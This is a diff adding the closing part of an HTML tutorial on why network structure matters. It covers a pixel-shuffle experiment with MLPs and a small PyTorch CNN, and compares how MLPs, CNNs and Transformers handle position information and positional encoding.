+        <p><strong>Run it yourself</strong> (no data to download; it's there once sklearn is installed): get the data with <code>load_digits()</code>, split with <code>train_test_split</code>, then train an <code>nn.Sequential(Linear(64,h), ReLU, Linear(h,10))</code> and the TinyConv above separately; the shuffled version just generates <code>perm = np.random.permutation(64)</code>, reorders <strong>both the training and test sets</strong> by <code>X[:, perm]</code>, and retrains. Results in tens of seconds.</p>
+        <p>Note that <code>digits</code> here is 8×8 with 1,797 images, much smaller than MNIST (28×28, 70,000 images), so the absolute numbers won't match the MNIST benchmarks you see elsewhere (single-hidden-layer MLP ~98%, CNN ~99.5%) — <strong>but the direction and the relative relationship are exactly the same, and that's what this experiment is meant to show.</strong></p>
+        </blockquote>
+        <p><strong>A teaching sequence for beginners:</strong> plain MLP (baseline) → the shuffle experiment (pin down the problem) → present convolution as "a local mini-MLP with shared weights" (TinyConv, keeping 2-D and postponing the flatten). Teaching CNNs directly isn't scary as long as you frame them as "the locally shared version of TinyNet":</p>
+        <pre class="python"><code>class TinyConv(nn.Module):
+    def __init__(self):
+        super().__init__()
+        self.conv = nn.Conv2d(1, 8, kernel_size=3, padding=1)  # 8 local 3×3 mini-MLPs, weights shared across the whole image
+        self.pool = nn.MaxPool2d(2)
+        self.fc   = nn.Linear(8 * 14 * 14, 10)
+    def forward(self, x):              # x: [B,1,28,28] — keep it 2-D, don&#39;t flatten at the input!
+        x = self.pool(torch.relu(self.conv(x)))   # [B,8,14,14]
+        x = x.flatten(1)                          # only flatten here, after local processing
+        return self.fc(x)
+</code></pre>
+        <h3 id="s15-4">4 Position information: what MLPs, CNNs and Transformers each lack, and how each makes up for it</h3>
+        <p>Anyone who has read about transformers has seen <strong>positional encoding (PE)</strong>. But the three architectures lack different things, and the root is <strong>whether weights are shared across positions</strong>:</p>
+        <table>
+        <thead>
+        <tr>
+        <th>Architecture</th>
+        <th>Weights across positions</th>
+        <th>Absolute position</th>
+        <th>Adjacency / order</th>
+        <th>What to do</th>
+        </tr>
+        </thead>
+        <tbody>
+        <tr>
+        <td><strong>MLP</strong></td>
+        <td>Not shared (each slot its own)</td>
+        <td><strong>Knows it</strong></td>
+        <td>No notion of adjacency</td>
+        <td>Switch to a CNN</td>
+        </tr>
+        <tr>
+        <td><strong>CNN</strong></td>
+        <td>Shared across space</td>
+        <td>Weakened (translation-equivariant)</td>
+        <td><strong>Keeps adjacency</strong> (the grid stays intact)</td>
+        <td>Locality is built in; usually no PE needed</td>
+        </tr>
+        <tr>
+        <td><strong>Transformer</strong></td>
+        <td>Shared across the sequence + set operations</td>
+        <td><strong>Doesn't know it at all</strong></td>
+        <td><strong>Order completely lost</strong></td>
+        <td><strong>Inject PE explicitly</strong></td>
+        </tr>
+        </tbody>
+        </table>
+        <ul>
+        <li><strong>The MLP</strong> lacks adjacency (made up for by the CNN), not position.</li>
+        <li><strong>Attention is the one that's truly "position-blind"</strong>: W_Q / W_K / W_V are shared across positions and relations are computed only from content (Q·K), with position nowhere in the formula → shuffle the token order and the output just gets shuffled along with it; it treats the sequence as a <strong>set</strong>. "the cat sat" and "sat the cat" are the same bag of words to it → <strong>PE must be injected</strong>.</li>
+        </ul>
+        <p>Shared weights buy efficiency and translation generalization at the cost of absolute position; the CNN still keeps the 2-D grid (adjacency intact) and needs no explicit fix, while attention loses order completely and can't do without one. Your original intuition that "near versus far matters" fits <strong>relative positional encoding</strong> especially well — <strong>the RoPE used by Qwen is a relative PE</strong>, which makes attention strength depend directly on the relative distance between two tokens.</p>
+        <h3 id="s15-5">5 What it means for you (as a deployer / model selector)</h3>
+        <ul>
+        <li><strong>Running / debugging / deploying a model</strong> (running vLLM, chasing OOM, tuning batch) — the mechanical view of "matmul + autograd" is basically enough; structure is secondary.</li>
+        <li><strong>Choosing / designing a model</strong> (what a deployer is really doing) — structure is <strong>decisive</strong>. "Is this model an encoder or a decoder, does it emit everything at once or generate token by token, does it have a cache that grows with the sequence" directly decides which engine it should use and whether it can benefit from concurrency. <strong>The whole of Part 2 is built on this structural criterion.</strong> One level up, "end-to-end multimodal vs a cascaded ASR → LLM → TTS" is also a trade-off between two <strong>structures</strong>, not a tuning question.</li>
+        </ul>
+        <p>To close in one sentence: <strong>the network learns the weights; the architect chooses the structure; the structure decides the most the weights can learn.</strong> "It's all matrix operations" isn't wrong; it just stops at the substrate and never reaches the layer that really explains everything.</p>
+      </article>
+    </main>
+    <footer>
+      <p>
+        Copyright © 2026 Lang Qiu (邱朗). This text is licensed under
+        <a href="https://creativecommons.org/licenses/by-nc/4.0/"
+          >CC BY-NC 4.0</a
+        >.
+      </p>
+    </footer>
+    <a class="to-top" href="#top" aria-label="Back to top">↑</a>
+  </body>
+</html>
